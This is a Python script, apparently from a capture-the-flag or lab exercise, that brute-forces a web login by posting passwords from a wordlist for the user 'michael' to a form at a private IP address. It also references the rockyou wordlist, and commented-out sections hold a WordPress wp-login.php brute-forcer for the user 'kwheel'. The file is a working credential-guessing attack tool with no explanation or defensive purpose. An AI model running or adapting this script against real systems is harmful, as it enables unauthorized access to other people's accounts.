import sys, requests, time
from math import trunc
# Globals vars
url = "http://10.10.139.137/login"
wordlist = "test.txt"
wl_len = len(open(wordlist, "r").readlines())
lines = []
threads = 5
splits = trunc(wl_len / threads)
index = 0
split_indexes = [0]

# Iterate to find starting indexes
for t in range(0,threads):
	index += splits
	split_indexes.append(index)

# Convert rockyou.txt to correct encoding
# iconv -f ISO-8859-1 -t UTF-8 /pentest/passwords/wordlists/rockyou.txt > rockyou_utf8.txt

# Append words into array
with open(wordlist, "r", errors='replace', encoding='UTF-8') as w:
	for x in range(wl_len):
		lines.append(w.readline().strip('\n'))

def request(pwd):
	data = {
	"username": "michael",
	"password": pwd
	}
	r = requests.post(url, data)
	response = r.ok
	return response

for i in split_indexes:
	try:
		#print(str(i) + "------------------------------")
		for l in range(i, (i+splits)):
			if request(lines[l]):
				print(lines[l] + "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!Success!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
			else:
				print(lines[l] + ": Invalid")
			#print(lines[l])
			if(i >= wl_len):
				print("Finished - 1")
				exit()

	except Exception as e:
		#print(e)
		print('Finished')
		exit()







#
# for line in lines:
# 	data = {
# 	"username": "michael",
# 	"password": line
# 	}
# 	r = requests.post(url, data)
# 	response = r.status_code
# 	if response == 403:
# 		print(line + " : Invalid")
# 	else:
# 		print(line + " : SUCCESS!!!!!!!!!!!!!!!!!!!!!")
# 		exit()








# import sys,requests,time
#
#
# url = "http://10.10.14.90/wp-login.php"
# file_path = "test.txt"
# file_len = len(open(file_path, "r").readlines())
# lines = []
#
#
# with open(file_path, "r", errors='replace', encoding='UTF-8') as f:
# 	for x in range(file_len):
# 		lines.append(f.readline().strip('\n'))
#
#
# for line in lines:
#     data = {
#     "log":"kwheel",
#     "pwd": line
#     }
#
#     request = requests.post(url, data)
#     print(request)
#
#     try:
#         request = requests.post(url, data)
#         if request.status_code == 200:
#             print("Fail: " + line)
#         else:
#             print("Success: " + line)
#             sys.exit()
#     except:
#         time.sleep(5)



#try:
#    init_help = sys.argv[1]
#    if init_help == "-h" or init_help == "--help" or len(sys.argv) < 6:
#        print("Usage:")
#        print("-U")
#        print("-P")
#        sys.exit()
#    else:
#        print("done")
#        exit()
        #execute(sys.argv)
#except IndexError:
#    raise SystemExit("-h or --help for usage")
